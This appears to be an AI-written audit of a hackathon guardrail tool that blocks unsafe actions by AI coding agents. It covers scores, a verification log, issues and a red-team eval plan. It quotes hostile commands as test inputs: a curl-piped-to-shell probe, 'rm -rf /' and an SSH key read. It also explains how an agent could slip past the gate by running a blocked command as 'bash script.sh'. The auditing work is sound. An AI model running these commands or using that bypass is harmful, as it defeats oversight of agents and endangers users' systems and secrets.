# Audit — Gemini 4 Argon (Medium) [v2 Local Deep-Dive] — 2026-10-26

## Scores (/10, one line of justification each)
| Dimension | Score | Why |
|---|---|---|
| Idea & goal focus | 9/10 | Crisp, high-leverage wedge ("deterministic fence decides, model explains") solving real vibe-coder security disasters without forcing an IDE/agent switch (`README.md:1-45`, `docs/project/STATUS.md:5`). |
| Correctness & completeness | 6/10 | Core CLI (`init`/`check`/`gate`/`checkpoint`/`undo`), 11 rules, git hooks, and OpenCode plugin work, but all 4 installed `SKILL.md` files teach agents to run non-existent CLI subcommands (`fence guard`, `fence plan`, `fence dial`, `fence anonymize`) that fail with exit code 2 (`src/cli.ts:152-153`). |
| Tests & evals quality | 7.5/10 | Assertions test real behavior (real `git commit` hook blocks, real `tsc`/test subprocesses, symlink escape resolution, zero-FP mention-vs-payload stripping), but the claimed "237 tests" is inflated by 110 duplicate tests copied into `dist/` during `bun run build` (`tools/generate.ts:51-57`). |
| Partner-env usage for tests/eval | 4.5/10 | Local 45-case held-out eval runner (`tools/eval.ts`) and pinned CI baseline (`tests/evals/baseline.json`) are well-engineered, but partner hardware spend is 0% executed today and `--redteam` only measures recall (FN) while ignoring precision (FP) and live `gate.ts` dispatch (`tools/eval.ts:220-267`). |
| Meta integration depth | 2.5/10 | Decorative/unwired today: `meta-client.ts` and `sam.ts` exist and one live probe succeeded (`resp_6adff4cb28da781ca979428b` in `.fence/meta-probe.json`), but zero CLI commands (`init`, `check`, `gate`, `checkpoint`, `undo`) ever invoke Muse Spark, Wonder, Image, or SAM (`src/cli.ts:1-163`). |
| GitHub hygiene | 8/10 | Verified live via `gh`: public repo, MIT license, 10 topics set, CI green in `24s` on `main` (`d51b002`), clean `hackathon-start` boundary—marred by an `npm` badge (`README.md:7`) that 404s on `registry.npmjs.org` (`npx vibe-fence init` fails remotely), `README.md` drift, and raw `.ts`/`.test.ts` shipped in the tarball (`package.json:33-38`). |
| Hackathon compliance | 6/10 | Pre-existing work boundary (`hackathon-start` at `44beb58` + `HACKATHON.md`) is exemplary, but hard submission gates (3-min YouTube video, live partner tech usage, honest load-bearing Meta model usage) are currently unfulfilled (`docs/project/SUBMIT.md:8-29`). |
| Demo/video readiness | 4/10 | Video is not recorded, and the script in `DEMO-SCRIPT.md` requires `npx vibe-fence init` (404s on npm until published), a Muse Spark 3-bullet plan card, a 2-option teachable fork, and Muse Image logo generation—none of which are wired into the CLI (`docs/research/synthesis/DEMO-SCRIPT.md:30-56`). |
| Winning potential | 5.5/10 | Strong contender on Impact (30%) and Technical Depth (20%) if judged on the deterministic rule engine, but will lose the 25% Meta AI Tooling criterion unless Muse Spark/Wonder are wired into the live `check`/`gate` loop before recording (`README.md:48-61`). |

---

## Local Execution & Live Verification Log (Step 2 + Deep-Dive Probes)

All commands were executed directly in `/Users/poferraz/Documents/Development/active/vibe-fence` on macOS (Bun `1.3.14`, Node `v20+`, `gh` CLI):

1. **Boundary & Git History (`git show hackathon-start --stat` & `git diff hackathon-start..HEAD --stat`):**
   - **Tag:** Annotated tag `hackathon-start` resolves to `44beb588fb8d25134c491dc54a94df89e1cb7434` (`Mon Oct 26 10:05:17 2026 -0700`, `"fix: prepare for public — track bun.lock, ignore .hermes"`).
   - **Pre-tag (`056e49c..411c7ca`, all dated `2026-10-21`):** 21 commits (research synthesis + M1–M4 scaffold).
   - **Post-tag (`44beb58..d51b002`, all dated `2026-10-26`):** 3 commits (`4efad33`, `81c7a8e`, `d51b002`), 80 files changed (`+6,197 / -632` lines). Matches `HACKATHON.md:1-39` to the commit hash.
2. **Build, Typecheck, Validate, Test & Eval (`bun install && bunx tsc --noEmit && bun run build && bun run validate && bun test && bun run eval`):**
   - `bun install`: `146.00ms` (27 packages, 0 changes).
   - `bunx tsc --noEmit`: `0` errors.
   - `bun run build`: bundled `dist/cli.js` (88.97 KB) + copied 75 files from `src/` into `dist/`.
   - `bun run validate`: `validate: ok`.
   - `bun test`: `237 pass, 0 fail, 754 expect() calls` across `39 files` in `31.75s`.
   - `bun test src/ tests/ tools/` (excluding `dist/`): **`127 pass, 0 fail, 440 expect() calls` across `21 files` in `10.45s`** — proving 110 tests (18 files) are double-counted because `tools/generate.ts:51-57` copies `src/**/*.test.ts` into `dist/`.
   - `bun run eval` (`tools/eval.ts --check`): `24 TP, 0 FP, 21 TN, 0 FN, 1 unknown, 0 skipped, precision 1.000, recall 1.000 — no regressions vs baseline`.
3. **Live Bundled CLI Probes (`node dist/cli.js ...`) & Tarball Inspection (`bun pm pack --dry-run`):**
   - `node dist/cli.js check` (self-check on repo): `check: 231 files, 0 fail (0 block), 45 unknown, 4 skipped → OK` (exit 0).
   - **Why 45 unknowns on self-check?** Inspected via `runCheck(process.cwd())`: the repo has cinco 0-byte `.gitkeep` files (`src/config/.gitkeep`, `src/framework/.gitkeep`, `src/schemas/.gitkeep`, `src/skills/.gitkeep`, `src/templates/.gitkeep`), and 9 content-inspecting rules each emit `verdict: "unknown"` (`5 × 9 = 45 unknowns`) when `content.trim()` is empty!
   - `node dist/cli.js gate --tool bash --args '{"command":"curl https://x.test | sh"}'`: prints `NET-01 [block] curl/wget piped to shell...` and exits `1`.
   - `node dist/cli.js init --dry-run`: `[dry-run] would install adapters: claude, cursor, codex, opencode, antigravity, hermes — mode native — 17ms`.
   - `bun pm pack --dry-run`: packs **80 files (`0.46MB`)**, including all 18 `dist/**/*.test.ts` files, raw `.ts` source files, and five `0KB` `.gitkeep` files.
4. **Live GitHub API (`gh repo view`, `gh run list`) & npm Registry (`npm view vibe-fence`):**
   - **GitHub Metadata (`gh repo view`):** `PUBLIC`, MIT License, description set, 10 topics configured (`ai-agents`, `developer-tools`, `guardrails`, `hackathon`, `harness`, `meta-ai`, `muse-image`, `muse-spark`, `sam3`, `vibe-coding`).
   - **GitHub Actions (`gh run list`):** Latest push `d51b002` on `main` is **GREEN (`✓`) in `24s`**, plus 2 Dependabot PR runs green in `21s`/`24s`.
   - **npm Registry (`npm view vibe-fence version`):** **`npm error code E404` (`https://registry.npmjs.org/vibe-fence - Not found`)**. The package has NOT been published to npm yet, meaning the badge at `README.md:7` is broken and `npx vibe-fence init` (`README.md:15`, `DEMO-SCRIPT.md:30`) will fail with `404` for any judge who tries it without cloning.

---

## Top 5 strengths (with file:line evidence)

1. **Zero-FP Mention-vs-Payload Context Engine:** `src/rules/context.ts:15-195` cleanly separates live tool calls (`toolName` set) from static tree scans, stripping comments and string literals (`liveCode` at `src/rules/context.ts:74-118`, `stripStrings` at `src/rules/context.ts:121-141`) while keeping backticks active and only firing shell/SQL rules on executable files or taint-lite sink lines (`sinkLines` at `src/rules/context.ts:38-43`). Verified live: `node dist/cli.js check` scans 231 files in this security-payload-filled repo with `0 fail (0 block)`.
2. **Real, Non-Faked Mechanical Verifier (`unknown ≠ pass`):** `src/framework/verifier.ts:160-205` and `runTrustLadder` (`src/framework/verifier.ts:376-420`) execute real subprocesses via `spawnSync`, cap logs to 4,096 bytes in `.fence/verdicts/` (`src/framework/verifier.ts:64-96`), refuse to pass when a script is missing or `echo`-stubbed (`unknown` blocks `overall: "pass"`), and detect test tampering (added `.skip`/`.only` or net-removed `expect()`) in `detectTestTampering` (`src/framework/verifier.ts:453-475`).
3. **Production-Grade Git Reversibility & Hook Chaining:** `checkpoint` (`src/framework/git.ts:110-137`) and `fenceUndo` (`src/framework/git.ts:156-214`) use shell-free `execFileSync("git", args)` (neutralizing command injection in labels, verified at `src/framework/git.test.ts:45-53`), distinguish unpushed contiguous checkpoints (`reset --soft`) from pushed/interleaved commits (`revert --no-commit`), and `installGitHooks` (`src/framework/git-hooks.ts:74-107`) chains pre-existing user hooks via `.pre-fence` and warns on `core.hooksPath` shadowing.
4. **End-to-End Proof Beats & Live Script-Body Auditing:** `tests/proof-beats.test.ts:50-122` tests the true `git commit` → `.git/hooks/pre-commit` → `src/cli.ts` → `runCheck` chain, and `localScriptBody` (`src/framework/gate.ts:83-96`) prevents an agent from laundering a blocked command (`curl|sh`, `rm -rf /`) by writing it into `./script.sh` and running `./script.sh` (`src/framework/gate.test.ts:91-102`).
5. **Honest Adversarial Bench, Held-Out Eval Corpus & Live Green CI:** `tests/adversarial/README.md:181-201` explicitly distinguishes deterministic catches from non-deterministic LLM refusal (`T6`), `tests/evals/corpus.json:1-61` uses distinct payloads from the unit tests gated in CI via `compareBaseline` (`tools/eval.ts:148-171`), and GitHub Actions workflow `.github/workflows/ci.yml:1-26` is verified green in `24s` on `origin/main` (`d51b002`).

---

## Top 10 issues (ranked; each: severity P0/P1/P2, file:line, one-line fix, effort S/M/L)

1. **[P0] Meta AI models are completely unwired from the CLI and runtime:** `src/cli.ts:1-163`, `src/check.ts:1-150`, and `src/framework/gate.ts:1-158` never import or call `companionCall` (`src/framework/meta-client.ts:247-259`), `architectCall` (`src/framework/meta-client.ts:261-277`), or `callSam` (`src/framework/sam.ts:97-149`). Only `tools/meta-probe.ts` calls `meta-client.ts`.
   - **Fix:** Wire an opt-in `--explain` / `--plan` path (or auto-trigger when `MUSE_API_KEY` is set) in `check`, `gate`, and a new `plan`/`verify` subcommand that calls `companionCall` (`muse-spark-1.3`) on findings and `architectCall` (`muse-wonder-1.0`) when `runTrustLadder` fails. **Effort:** M.
2. **[P0] Installed `SKILL.md` files instruct agents to run 10+ CLI commands that do not exist:** `src/install.ts:308-324` copies `src/skills/*/SKILL.md` into `.agents/skills/`, where agents read them as operational instructions. Those skills tell agents to run `fence guard add/check/allowlist`, `fence verify-remote --check rls`, `npx vibe-fence anonymize` (`src/skills/vibe-guard/SKILL.md:57-62`), `fence plan --task/--choice` (`src/skills/vibe-plan/SKILL.md:29-31`), `fence dial`, `fence learn` (`src/skills/vibe-teach/SKILL.md:29-31`), `fence validate`, `fence sync`, and `fence tour` (`src/skills/vibe-init/SKILL.md:53,69`). Every single one of those commands fails with `unknown subcommand` (`exit 2`) in `src/cli.ts:144-153`!
   - **Fix:** Rewrite the `## Usage` blocks in all 4 `src/skills/*/SKILL.md` files to use the real CLI commands (`vibe-fence init`, `vibe-fence check`, `vibe-fence gate`, `vibe-fence checkpoint`, `vibe-fence undo`) and wire `anonymize` / `verify` into `src/cli.ts`. **Effort:** S.
3. **[P0] `bun test` double-counts 110 tests by running `dist/**/*.test.ts` and packs tests into npm tarball:** `tools/generate.ts:51-57` copies all `src/**/*.test.ts` (18 files, 110 tests) into `dist/`. After `bun run build`, `bun test` runs 39 files (`237 pass` in `31.75s`) instead of 21 unique files (`127 pass` in `10.45s`), and `bun pm pack --dry-run` ships all `.test.ts` and raw `.ts` files in `vibe-fence-0.1.0.tgz`.
   - **Fix:** Exclude `*.test.ts` in `tools/generate.ts:51` and update test-count claims in docs (`EXTERNAL-AUDIT.md:39`, `STATUS.md:20`) to the true count (`127`). **Effort:** S.
4. **[P0] `vibe-fence` is 404 on npm (`npx vibe-fence init` fails) & `README.md` has major unbuilt claims:** Verified via `npm view vibe-fence`: package is not published on `registry.npmjs.org` (`E404`), so the badge at `README.md:7` is broken and `npx vibe-fence init` (`README.md:15,85,152`) fails unless published. Furthermore, `README.md:55` claims `muse-wonder-1.3` (vs `muse-wonder-1.0` in `src/framework/meta-client.ts:25`), `README.md:96` claims Cordis overlays + `npx vibe-fence web → http://127.0.0.1:3100`, and `README.md:169` says `"4 rules + 6 planned"` when 11 are built.
   - **Fix:** Publish `v0.1.0` to npm (`npm publish`) or replace `npx vibe-fence init` with local clone/tarball instructions until publish; scrub `README.md` to remove `:3100`/Cordis and fix `muse-wonder-1.0` + 11 rules. **Effort:** S.
5. **[P1] `--redteam` in `tools/eval.ts` cannot test benign FPs, `gate.ts` routing, or save JSON artifacts:** `tools/eval.ts:220-267` only asks the LLM for malicious payloads (measuring recall, never precision on tricky benign code), calls `REGISTRY[rule].check` directly instead of `evaluateToolCall` in `gate.ts`, hardcodes `probe.ts` for `SEC-03` (missing `.env`), and prints only to stdout instead of saving verifiable JSON logs with provider request IDs.
   - **Fix:** Add `--mode attack|benign` to `--redteam`, evaluate through both `runCheck` and `evaluateToolCall`, and write results + request IDs to `tests/evals/runs/<provider>-<model>.json`. **Effort:** M.
6. **[P1] `node dist/cli.js check` reports `(45 unknown — inspect manually)` on its own repo due to 0-byte `.gitkeep` files:** `src/check.ts:48-119` scans empty (0-byte) files like `src/config/.gitkeep` (5 files × 9 rules = 45 `unknown` findings) and prints a scary warning (`src/check.ts:143-145`) on every clean run.
   - **Fix:** Skip 0-byte files (`st.size === 0`) or `.gitkeep` in `src/check.ts:71` (`listFiles`), reducing self-check unknowns from `45` to `0`. **Effort:** S.
7. **[P1] `verifier.ts` (`runTrustLadder`) and `tools/anonymize.ts` are unreachable from `src/cli.ts`:** Both modules are implemented (`src/framework/verifier.ts:376-420`, `tools/anonymize.ts:204-287`), but `src/cli.ts:26-40` exposes neither `verify` nor `anonymize`, and `src/install.ts:385` advertises `npx vibe-fence tour` which immediately errors with exit 2 (`src/cli.ts:144-147`).
   - **Fix:** Wire `verify`, `anonymize`, and a working `tour` (or remove the `tour` prompt in `src/install.ts:385`) into `src/cli.ts`. **Effort:** S.
8. **[P1] Claude and Cursor adapters write empty/inert hook arrays, and `integrity.ts` is unwired:** `src/adapters/claude.ts:73-74` sets `PreToolUse: []` and `src/adapters/cursor.ts:103-104` sets `hooks: []`; meanwhile `verifyAttestation` (`src/framework/integrity.ts:113-149`) and `scanInvisibleUnicode` (`src/framework/integrity.ts:184-196`) are never called by `src/check.ts` or `tools/validate.ts`, and `postinstall-guard.sh` (`src/install.ts:263`) calls `tools/validate.ts` (absent in user repos).
   - **Fix:** Wire `scanInvisibleUnicode` + `verifyAttestation` into `src/check.ts`, change `postinstall-guard.sh` to run `vibe-fence check`, and wire Claude's `PreToolUse` hook to `vibe-fence gate`. **Effort:** S.
9. **[P2] Local script auditing in `gate.ts` misses `sh script.sh` / `bash script.sh`:** `localScriptBody` (`src/framework/gate.ts:83-96`) only checks the first token (`command.trim().split(/\s+/, 1)[0]`) and requires it to contain `/`. Running `sh ./evil.sh` or `bash scripts/evil.sh` has first token `sh`/`bash` (no `/`) and bypasses script-body auditing at the live gate.
   - **Fix:** In `localScriptBody`, when the first token is a shell interpreter (`sh`, `bash`, `zsh`, `source`, `.`), inspect the first non-flag positional argument for a local file path. **Effort:** S.
10. **[P2] Dead stubs and schema mismatch in `framework/` (`git.ts`, `dial.ts`, `circuit-breaker.ts`, `fence-look.ts`, `byte-capped-pipeline.ts`):** `isWithinProjectRoot` (`src/framework/git.ts:241-248`) returns `true` unconditionally, `buildTeachingCard` (`src/framework/dial.ts:166-190`) returns `"TODO"`, `pushToQueue` (`src/framework/circuit-breaker.ts:179-195`) writes a raw array to `.fence/queue.json` while `loadQueue` (`src/framework/queue.ts:42-49`) expects `{ version: 1, entries: [] }`, `runFenceLook` (`src/framework/fence-look.ts:160`) checks `META_API_KEY`/`MODEL_API_KEY` instead of `MUSE_API_KEY`, and `CONTEXT_BUDGET_PATH` (`src/framework/byte-capped-pipeline.ts:16`) hardcodes `src/framework/context-budget.yml` (which misses in packed installs).
    - **Fix:** Delete dead stubs, align `circuit-breaker.ts` with `queue.ts`, check `MUSE_API_KEY` in `fence-look.ts`, and resolve `context-budget.yml` via `hereDir()`. **Effort:** S.

---

## Deep-Dive Audit: Tests, Evals, Partner Credits & Meta Integration (Steps 3, 4, 5)

### Step 3: Test Suite & Adversarial Bench Quality
- **Are assertions meaningful?** Yes, on the core path. Rules test both positive (`fail`) and negative (`pass`) cases plus `unknown` on empty inputs. `src/rules/fs-01.test.ts:41-50` creates real symlinks pointing outside the temp root and proves `canonicalize` (`src/rules/fs-01.ts:48-68`) catches them. `src/rules/sec-03.test.ts:49-65` spawns a real `git init` with isolated `HOME` to verify `git check-ignore` on `.env`.
- **Do the 4 proof beats prove real behavior?** Yes (`tests/proof-beats.test.ts:50-122`): Beat 1 tests tree scan + live gate parity on `SEC-01`; Beat 2 tests `SEC-02`, `NET-01`, `CMD-01`, `GIT-01`, `SUP-01`, and benign pass-through; Beat 3 runs `runTrustLadder` on a real failing test script and verifies `.fence/verdicts/beat3-tests.log`; Beats 4a/4b test `checkpoint` → `fenceUndo` and a real `git commit` blocked by the installed `pre-commit` hook.
- **What critical paths are untested?** Zero unit tests exist for `meta-client.ts`, `install.ts`, `cli.ts` argument parsing, `integrity.ts`, `billing-guard.ts`, `verify-remote.ts`, `circuit-breaker.ts`, `dial.ts`, `queue.ts`, or `tools/anonymize.ts`.
- **Would I trust a demo on this suite?** I would trust the deterministic CLI (`init`, `check`, `gate`, `checkpoint`, `undo`) and OpenCode plugin 100% live on stage. I would **not** trust any Meta model feature on stage because none are wired or tested.

### Step 4: Partner-Environment Usage & Eval Assessment
- **Is `tests/evals/corpus.json` genuinely held-out from unit tests?** Yes. I spot-checked all 45 cases in `tests/evals/corpus.json:4-60` against `src/rules/*.test.ts`. The corpus uses different env vars (`NEXT_PUBLIC_ADMIN_SECRET`, `VITE_PAYMENTS_PRIVATE`), different sinks (`open("~/.ssh/id_rsa").read()` in Python, `db.execute("TRUNCATE audit_log")`), and different flags (`git push -f origin main` vs `--force`).
- **Is the baseline policy sound?** Mostly yes: `tests/evals/baseline.json:1-137` is pinned, gated in CI (`.github/workflows/ci.yml:25`), and checked per-rule and in total by `compareBaseline` (`tools/eval.ts:148-171`). **One flaw:** `baseline.json` sits at `1.000` precision / `1.000` recall across all 11 rules (45 cases). A 100% baseline on 45 hand-written cases looks synthetic to a seasoned judge; expanding the corpus with harder edge cases discovered via partner-credit red-teaming (where initial catch rate is <100%, then rules are hardened) will make the eval story far more credible.
- **What is missing in `--redteam` (`tools/eval.ts:194-267`)?**
  1. **No False-Positive (Benign) stress test:** It only prompts for attacks (`expect: fail`). You need a `--redteam-benign` prompt that generates tricky legitimate commands/code (e.g., `rm -rf ./dist/build`, `git push --force-with-lease origin main`, docs mentioning `.env`) to prove FP rate stays `<2%`.
  2. **Bypasses `gate.ts`:** Line 259 calls `REGISTRY[opts.rule].check` directly instead of `evaluateToolCall` (`src/framework/gate.ts:98`), missing tool-routing logic.
  3. **No saved run artifacts or billing-guard integration:** Output goes only to stdout, and `withBudgetCap` (`src/framework/billing-guard.ts:77`) is not wired into `tools/eval.ts` despite `docs/project/CREDITS-PLAN.md:38-39` claiming it as a guardrail.

### Step 5: Meta Integration Depth
- **Decorative vs. Load-Bearing:** Today, Meta integration is **decorative / scaffolding only**.
- **Verified live calls:** Exactly **one** live call has been made: `.fence/meta-probe.json` records `POST https://api.meta.ai/v1/responses` with model `muse-spark-1.3` and `requestId: "resp_6adff4cb28da781ca979428b"` at `2026-10-27T00:48:05.693Z`.
- **Model IDs:** `muse-spark-1.3` is verified live. `muse-wonder-1.0` (`src/framework/meta-client.ts:25`) is unverified (and contradicted by `muse-wonder-1.3` in `README.md:55`). SAM endpoint `/v1/sam/segment` (`src/framework/sam.ts:116`) is unverified.
- **Can "Why Meta's models are important" be written honestly TODAY?** **No.** As noted in `docs/project/SUBMIT.md:21-23`, until `muse-spark-1.3` generates the remediation/plan card on a blocked check/gate and `muse-wonder-1.0` escalates on a verifier failure, Meta models do not participate in any user workflow.

---

## Compliance checklist (each submit field: READY/GAP/BLOCKED + evidence)

| Submit Field | Status | Evidence & Missing Artifact |
|---|---|---|
| **Team Name** | **GAP** | Unchecked in `docs/project/SUBMIT.md:8`; trivial 1-minute user decision (`vibe-fence`). |
| **Track** | **READY** | Locked as `Indie developer track` (solo entrant Paulo Ferraz) in `HACKATHON.md:4` and `docs/project/SUBMIT.md:9-10`. |
| **Problem statement** | **READY** | Locked as `Build for Your World` in `HACKATHON.md:4` and `README.md:3`. |
| **Project Description** | **GAP** | Raw material exists in `README.md:36-45` and `tests/proof-beats.test.ts`, but final submission copy is not yet drafted in `docs/project/SUBMIT.md:14`. |
| **Public GitHub Repo** | **READY** | Verified live via `gh repo view`: `PUBLIC`, MIT `LICENSE:1-21`, 10 topics, `ci` workflow green in `24s` on `main`, `hackathon-start` tag + `HACKATHON.md:10-26` cleanly bound Oct 21 prior work vs Oct 26+ hackathon work. |
| **3-Minute YouTube Demo Video** | **BLOCKED** | Not recorded (`README.md:67-69`, `docs/project/SUBMIT.md:16-17`); blocked on wiring Muse Spark/Wonder into CLI so the scripted beats in `DEMO-SCRIPT.md` can be recorded honestly. |
| **Written "Use of Meta products"** | **BLOCKED** | Only 1 probe call (`resp_6adff4cb28da781ca979428b`) exists (`.fence/meta-probe.json:1-8`). Missing: live CLI wiring for Spark companion, Wonder escalation probe+wiring, Muse Image asset generation, SAM spot-check. |
| **Written "Why Meta's models are important"** | **BLOCKED** | Blocked until Muse Spark/Wonder are wired into `vibe-fence check` / `gate` / `verify` so Meta models drive the teachable remediation card and architect escalation (`docs/project/SUBMIT.md:21-23`). |
| **Feedback on Meta products** | **GAP** | Preliminary notes exist from the `muse-spark-1.3` `/v1/responses` probe, but needs real build/eval usage across Spark and Wonder to write substantive feedback (`docs/project/SUBMIT.md:24-25`). |
| **Feedback on partner tech** | **BLOCKED** | Zero partner inference calls have been run yet (`docs/project/CREDITS-PLAN.md:54-61`). Requires running the eval plan on Fireworks and Modal ($30 in hand) and recording run artifacts. |
| **Promo consent** | **READY** | Checked in `docs/project/SUBMIT.md:28`. |

---

## Proposed eval plan on partner credits (concrete: suites × models × ~cost × expected numbers)

To maximize the **Partner-Env Usage** and **Technical Depth (20%)** scores using credits **already in hand** (Modal $30 + Fireworks user-held) and the Meta API key (`.env`), upgrade `tools/eval.ts` to emit JSON receipts to `tests/evals/runs/` and execute these 4 suites:

| Suite | Partner / Hardware | Models (Open-Weights & Meta) | Workload & Token Math | Est. Cost | Expected Judge-Facing Numbers |
|---|---|---|---|---|---|
| **1. Adversarial Attack Red-Team (Recall Stress)** | **Fireworks AI** (serverless open-weights API) | `accounts/fireworks/models/llama-v3p3-70b-instruct` & `qwen2p5-coder-32b-instruct` | 11 rules × 50 obfuscated attack variants × 2 models = **1,100 generated attack payloads** (~55K in / ~330K out tokens). Evaluated through both `runCheck` and `evaluateToolCall`. | **~$0.35** (Fireworks held credits) | Initial catch rate **~78–86%** across 1,100 unseen LLM-generated attacks → harden regexes/sinks → re-run to show **94%+ catch rate** (delta table in README). |
| **2. Tricky Benign Near-Miss Suite (False-Positive Stress)** | **Fireworks AI** (serverless open-weights API) | `accounts/fireworks/models/llama-v3p3-70b-instruct` | 11 rules × 50 borderline-benign developer snippets (e.g., `rm -rf ./dist`, `git push --force-with-lease`, prose docs quoting `.env`, safe SQL migrations) = **550 benign cases** (~180K tokens). | **~$0.18** (Fireworks held credits) | **False-Block Rate < 1.5%** (target `0–1%` FP across 550 tricky benign inputs), empirically validating the `C-01` zero-FP claim. |
| **3. Containerized E2E Agent Replay + Mutational Fuzzing** | **Modal** ($30 credit in hand — Sandboxes + vLLM GPU) | Self-hosted `meta-llama/Llama-3.1-8B-Instruct` on Modal L4/A10G GPU + 550 isolated Modal Sandboxes | Spin up parallel Modal Sandboxes (`modal.Sandbox`) running real `git init` + `vibe-fence init` + simulated OpenCode tool bursts across the 5×4 rubric tasks (`auth`, `paid API`, `bug fix`, `ship-to-prod`, `add-dep`) × 20 seeds (Unfenced vs. Fenced) = **200 full repo trajectories** (~2.5M tokens + ~4 GPU-hours). | **~$6.50** of $30 Modal credit | **Unsafe-Action Rate: ~62% Unfenced → 0.0% Fenced** across 200 sandboxed repo builds, with wall-clock gate overhead **<15ms/call**. |
| **4. Live Meta Companion & Architect Escalation Eval** | **Meta Model API** (`.env` `MUSE_API_KEY`) | `muse-spark-1.3` (companion) + `muse-wonder-1.0` (architect) | 11 blocked findings (1 per rule) sent to `muse-spark-1.3` for goal-blind 1-line fix + 2-option card; 3 failing `runTrustLadder` verdicts escalated to `muse-wonder-1.0` = **14 live calls** (~25K tokens total), wrapped in `withBudgetCap({ maxCalls: 20, maxCostUsd: 0.50 })`. | **~$0.15** (Meta API) | **14/14 recorded `resp_*` request IDs** committed in `tests/evals/runs/meta-live.json`, proving 100% live schema compliance and sub-2s Spark remediation latency. |

**Total Spend:** **~$7.18** ($0.53 Fireworks + $6.50 Modal + $0.15 Meta API), leaving >$22 buffer on Modal and >$149 on Meta API while generating concrete, reproducible artifacts for `Feedback on partner tech` and `Use of Meta products`.

---

## Verdict

As an Indie judge today, I would **not** place this project in the top 3, because **25% of the score is "Use of Meta AI Tooling"** and right now Meta's models (`muse-spark-1.3`, `muse-wonder-1.0`, `SAM 3.1`) are completely unwired from the CLI—while the installed `SKILL.md` files instruct agents to run 10+ subcommands (`fence guard`, `fence plan`, `fence dial`) that crash with `unknown subcommand`. That is a shame, because the deterministic core (`check`, `gate`, `context.ts` mention-vs-payload engine, `checkpoint`/`undo`, live 24s green CI, and `hackathon-start` boundary hygiene) is genuinely some of the cleanest engineering in an Indie hackathon repo. **Single highest-ROI fix:** Wire `companionCall` (`muse-spark-1.3`) and `architectCall` (`muse-wonder-1.0`) directly into `vibe-fence check --explain` and `vibe-fence verify`, align the 4 `SKILL.md` files + `README.md` + `dist/` test exclusions with the real CLI, and run the $7 Fireworks/Modal eval plan before recording the video.

---

## Could not verify

1. **Live partner inference execution (`--redteam` on Fireworks, Modal, Baseten):** No `FIREWORKS_API_KEY`, Modal token, or Baseten key was present in the local environment, and I did not make paid external calls.
2. **Live `muse-wonder-1.0`, Muse Image, and SAM 3.1 (`/v1/sam/segment`) endpoints:** `.fence/meta-probe.json` proves `muse-spark-1.3` answered live (`resp_6adff4cb28da781ca979428b`), but no recorded probe exists for `muse-wonder-1.0`, Muse Image, or SAM 3.1, and I did not spend live credits from `.env`.
3. **Authenticated Cerebral Valley portal rules text:** Verified against the user-pasted fields in `docs/project/SUBMIT.md` and `docs/project/CREDITS-PLAN.md`, as the live portal submission form is behind login.
